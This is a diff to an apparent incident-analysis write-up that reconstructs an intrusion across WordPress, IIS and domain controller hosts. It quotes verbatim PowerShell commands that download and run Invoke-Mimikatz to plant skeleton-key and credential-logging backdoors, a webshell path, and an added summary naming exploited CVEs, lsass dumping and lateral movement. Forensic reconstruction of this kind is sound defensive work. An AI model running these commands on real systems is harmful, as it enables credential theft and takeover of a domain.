@@ -54,7 +54,7 @@ c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4
 
 * 04/Aug/2020:23:07:16, use tunnel request ```http://192.168.1.3/umbraco/bbbb.aspx``` it's webshell
 
-# dc server
+# windows dc server
 * 2020/08/04:09:23:44, invoke Mimikatz via ```cmd.exe /Q /c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" 1> \\127.0.0.1\ADMIN$\__1596450222.629457 2>&1``` by ```WIN-LN8SES7K1Q5$```
 
 * 2020/08/04:09:24:46, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'" ``` by ``` Administrator ```
@@ -66,3 +66,15 @@ c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4
 * 2020/08/04:09:26:37, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" ``` by ``` Administrator ```
 
 * 2020/08/05:22:25:34, exec ipconfig.exe by ```TEAMT5\Administrator```
+
+# how attack
+* ubuntu wordpress web server : ```CVE-2019-9978``` to get webshell and ```sqlmap``` to get wropress admin account
+
+* windows IIS server : ```CVE-2020-0688``` (awaiting to determinate) attack then create webshell
+
+* windows dc server : in IIS server dump IIS server's lssas.exe and use Minikatz to get dc's admin 's account and password
+
+# Horizon move
+* ubuntu -> IIS : bt.ext and nt.exe
+
+* IIS -> dc : create process ipconfig.exe
